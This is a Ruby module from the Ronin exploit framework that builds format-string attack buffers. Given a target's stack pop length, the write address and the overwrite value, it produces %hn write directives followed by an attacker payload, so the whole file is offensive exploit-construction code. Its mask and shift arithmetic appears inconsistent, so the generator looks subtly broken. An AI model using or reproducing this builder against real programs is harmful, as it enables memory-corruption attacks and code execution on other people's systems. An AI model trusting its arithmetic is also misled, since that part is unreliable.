#
# Ronin - A decentralized repository for the storage and sharing of computer
# security advisories, exploits and payloads.
#
# Copyright (c) 2007 Hal Brodigan (postmodern at users.sourceforge.net)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'exploits/platformexploit'

require 'og'

module Ronin
  module Exploits
    class FormatStringTarget < Target

      # Pop length
      attr_accessor :pop_length, Integer

      # Address
      attr_accessor :address, Integer

      # Overwrite
      attr_accessor :overwrite, Integer

      belongs_to :format_string

      def initialize(product_version='',platform=nil,pop_length=0,address=0x0,overwrite=0x0,comments="",&block)
	@pop_length = pop_length 
	@address = address 
	@overwrite = overwrite

	super(product_version,platform,comments,&block)
      end

    end

    class FormatString < PlatformExploit

      has_many :targets, FormatStringTarget

      def initialize
	builder do |fmt|
	  fmt.data = fmt.prefix+build_format_string(get_target,payload.to_s)+fmt.postfix
	end

	super
      end

      def target(product_version='',platform=nil,pop_length=0,address=0x0,overwrite=0x0,comments="",&block)
	add_target(FormatStringTarget.new(product_version,platform,pop_length,address,overwrite,comments,&block))
      end

      def build_format_string(target=get_target,payload_str="")
	buffer = target.overwrite.pack(target.platform.arch)+(target.overwrite+(target.platform.arch.address_length/2)).pack(target.platform.arch)

	low_mask = 0xff
	(target.platform.arch.address_length/2).times do
	  low_mask <<= 8
	  low_mask |= 0xff
	end

	high_mask = low_mask << (target.platform.arch.address_length*4)
	high = (target.address & high_mask) >> (target.platform.arch.address_length/2)
	low = target.address & low_mask

	if low<high
	  low-=(target.platform.arch.address_length*2)
	  buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",low,target.pop_length,high-low,target.pop_length+1)
	else
	  high-=(target.platform.arch.address_length*2)
	  buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",high,target.pop_length+1,low-high,target.pop_length)
	end
	buffer+=payload_str

	return buffer
      end

    end
  end
end
